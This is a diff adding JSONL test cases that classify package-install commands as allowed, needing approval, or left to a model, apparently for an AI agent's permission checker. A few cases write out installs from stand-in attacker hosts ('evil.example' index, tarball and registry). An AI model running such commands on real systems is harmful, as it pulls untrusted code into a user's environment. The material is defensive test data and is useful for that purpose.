@@ -1,0 +1,24 @@
+{"id":"pk-pip-undeclared","cmd":"pip install tenacity-utils-pro==9.9.9","expect":"model","rules":["packages.install_undeclared"],"manifest":{"requirements.txt":"requests==2.32.0\npytest>=8\n"}}
+{"id":"pk-pip-declared-neg","cmd":"pip install requests","expect":"allow","not_rules":["packages.install_undeclared"],"manifest":{"requirements.txt":"requests==2.32.0\n"}}
+{"id":"pk-pip-r-requirements-neg","cmd":"pip install -r requirements.txt","expect":"allow","not_rules":["*"],"manifest":{"requirements.txt":"requests\n"}}
+{"id":"pk-pip-editable-neg","cmd":"pip install -e .","expect":"allow","not_rules":["packages.install_undeclared"],"manifest":{"pyproject.toml":"[project]\nname='x'\n"}}
+{"id":"pk-pip-no-manifest-neg","cmd":"pip install somepkg","expect":"allow","not_rules":["packages.install_undeclared"],"note":"no manifest: cannot judge, do not guess"}
+{"id":"pk-pip-git-url","cmd":"pip install git+https://github.com/someone/lib.git","expect":"ask","rules":["packages.install_from_url_or_vcs"]}
+{"id":"pk-pip-index","cmd":"pip install --index-url https://mirror.evil.example/simple pkg","expect":"ask","rules":["packages.alternate_index"]}
+{"id":"pk-pip-extra-index","cmd":"pip install --extra-index-url https://pkgs.internal.example/simple pkg","expect":"ask","rules":["packages.alternate_index"]}
+{"id":"pk-pip-allowed-index-neg","cmd":"pip install -i https://pypi.org/simple requests","expect":"allow","not_rules":["packages.alternate_index"],"manifest":{"requirements.txt":"requests\n"}}
+{"id":"pk-uv-pip-undeclared","cmd":"uv pip install leftpad-ng","expect":"model","rules":["packages.install_undeclared"],"manifest":{"pyproject.toml":"[project]\ndependencies=[\"pydantic>=2\"]\n"}}
+{"id":"pk-npm-undeclared","cmd":"npm install left-pad-pro","expect":"model","rules":["packages.install_undeclared"],"manifest":{"package.json":"{\"dependencies\":{\"react\":\"^18\"}}"}}
+{"id":"pk-npm-declared-neg","cmd":"npm install react","expect":"allow","not_rules":["packages.install_undeclared"],"manifest":{"package.json":"{\"dependencies\":{\"react\":\"^18\"}}"}}
+{"id":"pk-npm-ci-neg","cmd":"npm ci","expect":"allow","not_rules":["*"],"manifest":{"package.json":"{}"}}
+{"id":"pk-npm-install-noargs-neg","cmd":"npm install","expect":"allow","not_rules":["packages.install_undeclared"],"manifest":{"package.json":"{}"}}
+{"id":"pk-npm-global","cmd":"npm install -g some-cli","expect":"ask","rules":["packages.global_or_system_install"]}
+{"id":"pk-npx-remote","cmd":"npx create-something@latest my-app","expect":"ask","rules":["packages.run_remote_script"]}
+{"id":"pk-pnpm-dlx","cmd":"pnpm dlx shadcn@latest init","expect":"ask","rules":["packages.run_remote_script"]}
+{"id":"pk-npm-tarball-url","cmd":"npm install https://evil.example/pkg.tgz","expect":"ask","rules":["packages.install_from_url_or_vcs"]}
+{"id":"pk-npm-registry","cmd":"npm install --registry https://registry.evil.example pkg","expect":"ask","rules":["packages.alternate_index"]}
+{"id":"pk-brew-install","cmd":"brew install ripgrep","expect":"ask","rules":["packages.global_or_system_install"]}
+{"id":"pk-apt-install","cmd":"sudo apt-get install -y jq","expect":"ask","rules":["packages.global_or_system_install","shell.sudo"]}
+{"id":"pk-cargo-install","cmd":"cargo install cargo-audit","expect":"model","rules":["packages.install_undeclared"],"manifest":{"Cargo.toml":"[dependencies]\nserde = \"1\"\n"}}
+{"id":"pk-go-get-neg","cmd":"go get github.com/stretchr/testify","expect":"allow","not_rules":["packages.install_undeclared"],"note":"go install/get: manifest check not applied to go yet"}
+{"id":"pk-pip-list-neg","cmd":"pip list --outdated","expect":"allow","not_rules":["*"]}
